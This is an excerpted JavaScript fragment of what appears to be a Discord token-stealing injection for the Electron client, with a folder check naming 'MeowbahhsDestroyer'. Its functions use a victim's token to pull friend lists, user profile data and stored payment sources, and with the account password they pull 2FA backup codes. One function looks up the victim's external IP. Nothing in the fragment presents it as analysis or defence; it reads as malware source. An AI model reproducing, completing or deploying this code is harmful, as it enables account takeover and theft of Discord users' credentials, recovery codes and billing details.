...
async function firstTime() {
    ...
    if (!fs.existsSync(path.join(__dirname, "MeowbahhsDestroyer"))) return true
...
async function getRelationships(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, true)
...
async function get2faCodes(token, password) {
    const window = BrowserWindow.getAllWindows()[0];
    let data = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, true)
    return JSON.parse(data).backup_codes.map(codeData => `${codeData.code} ${codeData.consumed ? '(USED)' : ''}`)
}
async function getBilling(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, true)
    var json = JSON.parse(a)
...
async function getUserInfo(token) {
    const window = BrowserWindow.getAllWindows()[0];
    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, true)
    return JSON.parse(a)
}
async function getIp() {
    const window = BrowserWindow.getAllWindows()[0];
    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, true)
    return ip
}
...
function getDiscordClient() {
    return process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0]
}
